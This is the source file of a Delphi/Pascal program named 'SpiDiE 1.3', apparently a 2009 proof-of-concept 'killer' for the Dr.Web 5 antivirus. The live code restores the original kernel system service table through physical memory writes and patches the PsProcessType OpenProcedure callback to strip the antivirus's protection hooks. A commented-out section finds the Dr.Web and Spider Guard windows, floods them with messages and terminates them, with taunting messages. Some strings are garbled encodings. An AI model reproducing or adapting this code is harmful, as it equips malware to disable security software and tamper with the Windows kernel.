{$E EXE}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$IFDEF minimum}
program Spidie;
{$ENDIF}
unit Spidie;
interface

uses
  Windows, WinNative, WinBase, Messages, Loader, RTL, Ring0, FMM;

implementation

var
  bFound1: boolean = false;
  bFound2: boolean = false;
  bFound3: boolean = false;

const
  DrWeb5Title: PWideChar = 'Dr.Web';
  SpiderGuard: PWideChar = 'Spider Guard';
  SpiderAgent: PWideChar = 'SpiderAgent Main';
  KeServiceDescriptorTable: PAnsiChar = 'KeServiceDescriptorTable';
  SpiDiE10: PAnsiChar = 'SpiDiE 1.3';
  Str2: PAnsiChar = '������ SWW :) �� �����, ��� �� ������ ���������, ������� - ������, � �� � ���� ���� :)';
  DrWeb5TitleLen: integer = 6;
  SpiderGuardLen: integer = 12;
  SpiderAgentLen: integer = 16;

{$R version.res}
type
  _SERVICE_DESCRIPTOR_ENTRY = record
    ServiceTableBase: PPVOID;
    ServiceCounterTableBase: PPVOID; //Used only in checked build
    NumberOfServices: DWORD;
    ParamTableBase: PBYTE;
  end;
  SERVICE_DESCRIPTOR_ENTRY = _SERVICE_DESCRIPTOR_ENTRY;
  PSERVICE_DESCRIPTOR_ENTRY = ^_SERVICE_DESCRIPTOR_ENTRY;

  _DWBUF = array[0..0] of DWORD;
  DWBUF = _DWBUF;
  PDWBUF = ^_DWBUF;

  _SYSINFO_BUFFER = record
    Count: ULONG;
    ModInfo: array[0..0] of SYSTEM_MODULE_INFORMATION;
  end;
  SYSINFO_BUFFER = _SYSINFO_BUFFER;
  PSYSINFO_BUFFER = ^_SYSINFO_BUFFER;

const
  IMAGE_ORDINAL_FLAG32 = $80000000;
  WINXP_SDT_ENTRIES_COUNT = 284;

var
  KernelSize: DWORD;
  KernelBase, pOriginalSDT: PVOID;

function FindOrigSDT(const pKernel: pointer; kernelBase: DWORD): DWORD;
var
  t: DWORD;
  p1: PChar;
begin
  result := 0;
  t := DWORD(FastGetProcAddress(HINST(pKernel), KeServiceDescriptorTable)) - DWORD(pKernel);
  p1 := pKernel;
  repeat
    if ((PWORD(p1)^ = $05C7) and (PDWORD(p1 + 2)^ = t + kernelBase)) then
    begin
      result := PDWORD(p1 + 6)^ - kernelBase;
      break;
    end;
    inc(p1);
  until false;
end;

function GetKeServiceDescriptorTable(fPtr: PChar): PVOID;
var
  c: DWORD;
begin
  for c := 0 to 4095 do
    if (PWORD(fPtr + c)^ = $888D) then
    begin
      result := PPVOID(fPtr + c + 2)^;
      exit;
    end;
  result := nil;
end;

procedure GetOriginalSystemState();
var
  psdt: PVOID;
  modinf: SYSINFO_BUFFER;
  bytesIO: ULONG;
  textbuf: array[0..MAX_PATH - 1] of WideChar;
begin
  bytesIO := 0;
  ZwQuerySystemInformation(SystemModuleInformation, @modinf, sizeof(SYSINFO_BUFFER), @bytesIO);
  if (bytesIO = 0) then exit;
  strcpyW(textbuf, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(textbuf, '\system32\');
  RtlAnsiToUnicode(strendW(textbuf), @modinf.ModInfo[0].ImageName[modinf.ModInfo[0].ModuleNameOffset]);
  KernelBase := modinf.ModInfo[0].Base;
  pntkernel := PELdrLoadLibrary(textbuf, nil, modinf.ModInfo[0].Base);
  if (pntkernel <> nil) then
  begin
    KernelSize := PEGetVirtualSize(pntkernel);
    psdt := PChar(pntkernel) + FindOrigSDT(pntkernel, DWORD(modinf.ModInfo[0].Base));
    pOriginalSDT := fmmAlloc(ProcessHeapHandle, WINXP_SDT_ENTRIES_COUNT * sizeof(DWORD), TRUE);
    memcopy(pOriginalSDT, psdt, WINXP_SDT_ENTRIES_COUNT * sizeof(DWORD));
  end;
end;

function MapPhysMem(hPhyMem: THANDLE; PhyAddr: PDWORD; Length: PDWORD; VirtAddress: PPVOID): PVOID; stdcall;
var
  ViewBase: LARGE_INTEGER;
begin
  VirtAddress^ := nil;
  ViewBase.LowPart := 0;
  ViewBase.HighPart := 0;
  ViewBase.QuadPart := int64(PhyAddr^);
  ZwMapViewOfSection(hPhyMem, DWORD(-1), VirtAddress, 0, Length^, @viewBase, Length, ViewShare, 0, PAGE_READWRITE);
  PhyAddr^ := DWORD(viewBase.LowPart);
  result := pointer(viewBase.LowPart);
end;

procedure UnmapPhysMem(VirtualAddr: PVOID);
begin
  ZwUnmapViewOfSection(DWORD(-1), VirtualAddr);
end;

var
  PsProcessType: OBJECT_TYPE; 

function RemoveDwProtHooks(): boolean;
var
  start: DWORD;
  serviceTable: PDWBUF;
  len, wantedAddr: DWORD;
  ptr, pAddr: PChar;
  hPhysMem: THANDLE;
  p1, sdtAddr: PVOID;
  bytesIO: ULONG;
  Status: NTSTATUS;
  rv: MEMORY_CHUNKS;
  serviceTableAddress: ULONG;
  entries: array[0..3] of SERVICE_DESCRIPTOR_ENTRY;
begin
  result := false;
  GetOriginalSystemState();

  sdtAddr := FastGetProcAddress(HINST(pntkernel), KeServiceDescriptorTable);
  p1 := PChar(sdtAddr) - DWORD(pntkernel) + DWORD(KernelBase) - sizeof(entries);

  if (p1 <> nil) then
  begin
    memzero(@entries, sizeof(entries));
    rv.Address := p1;
    rv.Data := @entries;
    rv.Length := sizeof(entries);
    Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
    if (Status = STATUS_SUCCESS) then
    begin
      hPhysMem := OpenPhysicalMemory(SECTION_MAP_READ or SECTION_MAP_WRITE);
      if (hPhysMem <> 0) then
      begin
        serviceTableAddress := DWORD(entries[0].ServiceTableBase);
        pAddr := PChar(serviceTableAddress) - $80000000;
        wantedAddr := ULONG(pAddr);
        len := $200;
        if (MapPhysMem(hPhysMem, @pAddr, @len, @ptr) <> nil) then
        begin
          start := wantedAddr - ULONG(pAddr);
          serviceTable := @ptr[start];
          memcopy(serviceTable, pOriginalSDT, sizeof(DWORD) * entries[0].NumberOfServices);
          UnMapPhysMem(ptr);
        end;
        ZwClose(hPhysMem);
      end;
      memzero(@PsProcessType, sizeof(OBJECT_TYPE));
      p1 := PChar(FastGetProcAddress(HINST(pntkernel), 'PsProcessType')) - DWORD(pntkernel) + DWORD(KernelBase);
      rv.Address := p1;
      rv.Data := @p1;
      rv.Length := sizeof(DWORD);
      Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
      if (Status = STATUS_SUCCESS) then
      begin
        rv.Address := p1;
        rv.Data := @PsProcessType;
        rv.Length := sizeof(OBJECT_TYPE);
        Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
        if (Status = STATUS_SUCCESS) then
        begin
          bytesIO := 0;
          rv.Address := pointer(DWORD(p1) + $90); //OpenProcedure removal
          rv.Data := @bytesIO;
          rv.Length := sizeof(DWORD);
          Status := ZwSystemDebugControl(DbgWriteVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
          result := (Status = STATUS_SUCCESS);
        end;
      end;
    end;
  end;
  if (pOriginalSDT <> nil) then fmmFree(ProcessHeapHandle, pOriginalSDT);
end;

function drweb5(_hwnd: HWND; lParam: LPARAM): BOOL; stdcall;
var
  buf: LBuf;
begin
  if not bFound1 then
  begin
    GetWindowTextW(_hwnd, @buf, MAX_PATH);
    if (strcmpinW(buf, DrWeb5Title, DrWeb5TitleLen) = 0) then
    begin
      PULONG(lParam)^ := _hwnd;
      bFound1 := true;
    end;
  end;
  result := true;
end;

function spider5(_hwnd: HWND; lParam: LPARAM): BOOL; stdcall;
var
  buf: LBuf;
begin
  if not bFound2 then
  begin
    GetWindowTextW(_hwnd, @buf, MAX_PATH);
    if (strcmpinW(buf, SpiderGuard, SpiderGuardLen) = 0) then
    begin
      PULONG(lParam)^ := _hwnd;
      bFound2 := true;
    end;
  end;
  result := true;
end;

function spideragent5(_hwnd: HWND; lParam: LPARAM): BOOL; stdcall;
var
  buf: LBuf;
begin
  if not bFound3 then
  begin
    GetWindowTextW(_hwnd, @buf, MAX_PATH);
    if (strcmpinW(buf, SpiderAgent, SpiderAgentLen) = 0) then
    begin
      PULONG(lParam)^ := _hwnd;
      bFound3 := true;
    end;
  end;
  result := true;
end;

function GetDrWebMainWindow(): HWND;
begin
  bFound1 := false;
  result := 0;
  EnumWindows(@drweb5, Integer(@result));
end;

function GetSpiderAgentWindow(): HWND;
begin
  bFound2 := false;
  result := 0;
  EnumWindows(@spideragent5, Integer(@result));
end;

function GetSpiderGuardWindow(): HWND;
begin
  bFound2 := false;
  result := 0;
  EnumWindows(@spider5, Integer(@result));
end;

procedure RandomizeEx;
var
  systemTime:
  record
    wYear: Word;
    wMonth: Word;
    wDayOfWeek: Word;
    wDay: Word;
    wHour: Word;
    wMinute: Word;
    wSecond: Word;
    wMilliSeconds: Word;
    reserved: array[0..7] of char;
  end;
asm
        LEA     EAX,systemTime
        PUSH    EAX
        CALL    GetSystemTime
        MOVZX   EAX,systemTime.wHour
        IMUL    EAX,60
        ADD     AX,systemTime.wMinute   { sum = hours * 60 + minutes    }
        IMUL    EAX,60
        XOR     EDX,EDX
        MOV     DX,systemTime.wSecond
        ADD     EAX,EDX                 { sum = sum * 60 + seconds              }
        IMUL    EAX,1000
        MOV     DX,systemTime.wMilliSeconds
        ADD     EAX,EDX                 { sum = sum * 1000 + milliseconds       }
        MOV     RandSeed,EAX
end;

procedure ShowMessage(PStr: PAnsiChar; Buttons: DWORD);
begin
  MessageBoxA(GetDesktopWindow, PStr, SpiDiE10, Buttons);
end;

procedure main();
//var
//  DrWebHwnd: HWND;
//  SpiderHwnd: HWND;
//  u, k, i: integer;
begin
  RemoveDwProtHooks();
{  ShowMessage('DrWeb5 user mode proof-of-concept killer (trash code included)'#13#10 +
    'DKOH and fucking Shadow SSDT will not help DrWeb!'#13#13#10 +
    '(c) 2009 by EP_X0FF', MB_OK);
  RandomizeEx();
  DrWebHwnd := GetDrWebMainWindow();
  if (DrWebHwnd <> 0) then
  begin
    ShowMessage('DrWeb GUI application located :) Let''s do some fuck with it ^_^', MB_ICONINFORMATION);
    for i := $FF to $FFFFF do
    begin
      u := random($FFFF);
      k := random(u) + random($FFF);
      PostMessageW(DrWebHwnd, i, u, k);
    end;
    ShowMessage('Muhahaha, see u in HELL', MB_ICONWARNING);
  end;

  SpiderHwnd := GetSpiderGuardWindow();
  if (SpiderHwnd <> 0) then
  begin
    ShowMessage('Spider Guard located :) Let''s UnGuard it ololo!!!11', MB_ICONINFORMATION);
    if (RemoveDwProtHooks()) then
    begin
      NtSleep(1000);
      SpiderHwnd := GetSpiderGuardWindow();
      if (SpiderHwnd <> 0) then
        if EndTask(SpiderHwnd, false, true) then ShowMessage('Guardian removed...', MB_ICONINFORMATION);
    end else ShowMessage('Ohh shit!', MB_OK);

    SpiderHwnd := GetSpiderAgentWindow();
    if (SpiderHwnd <> 0) then
    begin
      ShowMessage('Spider Agent also found, proceeding killing...', MB_ICONINFORMATION);
      if EndTask(SpiderHwnd, false, true) then ShowMessage('Spider Agent is gone to hell', MB_ICONINFORMATION);
    end;
    ShowMessage('That''s all folks!', MB_OK);
  end;

  if not bFound1 and not bFound2 and not bFound3 then ShowMessage('Nothing found :('#13#10 + 'Start DrWeb5 first! =)', MB_OK);  }
end;

var
  osver: OSVERSIONINFOEXW;
  bytesIO: DWORD;
begin
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber > 2600) then
  begin
    ShowMessage('Unsupported OS <����_�����>', MB_ICONINFORMATION);
  end else
  begin
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, true, false, @bytesIO);
    ProcessHeapHandle := fmmCreate();
    main();
    fmmDestroy(ProcessHeapHandle);
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @pntkernel, @bytesIO, MEM_RELEASE);
  end;
  ExitProcess(0);
  asm
    call Str2
  end;
end.

